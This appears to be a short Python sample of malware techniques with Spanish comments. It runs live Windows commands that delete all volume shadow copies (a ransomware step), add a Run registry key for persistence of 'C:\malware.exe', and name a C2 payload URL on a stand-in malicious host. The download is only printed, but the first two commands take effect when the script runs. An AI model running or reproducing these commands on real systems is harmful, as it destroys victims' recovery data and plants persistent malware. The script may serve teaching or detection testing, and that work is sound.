import os
# Borrado de Shadow Copies (Ransomware)
os.system("vssadmin.exe delete shadows /all /quiet")
# Persistencia en Registro (Troyano)
os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d 'C:\malware.exe'")
# Comunicación con C2
url = "http://servidor-malvado.xyz/payload.exe"
print(f"Descargando de {url}")
